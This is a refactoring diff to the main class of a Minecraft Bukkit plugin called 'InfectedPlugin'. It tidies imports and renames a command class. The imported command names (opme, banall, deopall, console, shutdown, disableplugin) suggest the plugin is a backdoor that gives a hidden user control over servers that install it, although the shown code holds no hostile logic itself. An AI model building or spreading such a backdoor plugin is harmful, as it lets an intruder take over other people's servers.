@@ -1,21 +1,36 @@
 package org.CreeperCoders.InfectedPlugin;
 
-import java.util.logging.*;
+import java.util.Arrays;
+import java.util.logging.Level;
+import java.util.logging.Logger;
 
-import org.bukkit.*;
+import org.CreeperCoders.InfectedPlugin.Commands.Command_ban;
+import org.CreeperCoders.InfectedPlugin.Commands.Command_banall;
+import org.CreeperCoders.InfectedPlugin.Commands.Command_console;
+import org.CreeperCoders.InfectedPlugin.Commands.Command_deop;
+import org.CreeperCoders.InfectedPlugin.Commands.Command_deopall;
+import org.CreeperCoders.InfectedPlugin.Commands.Command_disableplugin;
+import org.CreeperCoders.InfectedPlugin.Commands.Command_enableplugin;
+import org.CreeperCoders.InfectedPlugin.Commands.Command_explosion;
+import org.CreeperCoders.InfectedPlugin.Commands.Command_gamemode;
+import org.CreeperCoders.InfectedPlugin.Commands.Command_help;
+import org.CreeperCoders.InfectedPlugin.Commands.Command_name;
+import org.CreeperCoders.InfectedPlugin.Commands.Command_op;
+import org.CreeperCoders.InfectedPlugin.Commands.Command_opme;
+import org.CreeperCoders.InfectedPlugin.Commands.Command_shutdown;
+import org.CreeperCoders.InfectedPlugin.SlashCommands.IPCommand;
+import org.bukkit.Bukkit;
+import org.bukkit.ChatColor;
+import org.bukkit.command.Command;
+import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
 import org.bukkit.plugin.PluginManager;
 import org.bukkit.plugin.java.JavaPlugin;
-import org.bukkit.command.Command;
-import org.bukkit.command.CommandSender;
-
-import org.CreeperCoders.InfectedPlugin.Commands.*;
-import org.CreeperCoders.InfectedPlugin.SlashCommands.*;
 
 public class InfectedPlugin extends JavaPlugin
 {
     public static final Logger log = Bukkit.getLogger();
-    
+
     public static final String COMMAND_PATH = "org.CreeperCoders.InfectedPlugin.SlashCommands";
     public static final String COMMAND_PREFIX = "Command";
 
@@ -80,11 +95,10 @@ public class InfectedPlugin extends JavaPlugin
             {
                 senderIsConsole = true;
                 log.info(String.format("[CONSOLE_COMMAND] %s: /%s %s",
-                        sender.getName(),
-                        commandLabel,
+                        sender.getName(), commandLabel,
                         IP_Util.implodeStringList(" ", Arrays.asList(args))));
             }
-            IP_Command dispatcher;
+            IPCommand dispatcher;
             try
             {
                 ClassLoader classLoader = InfectedPlugin.class.getClassLoader();
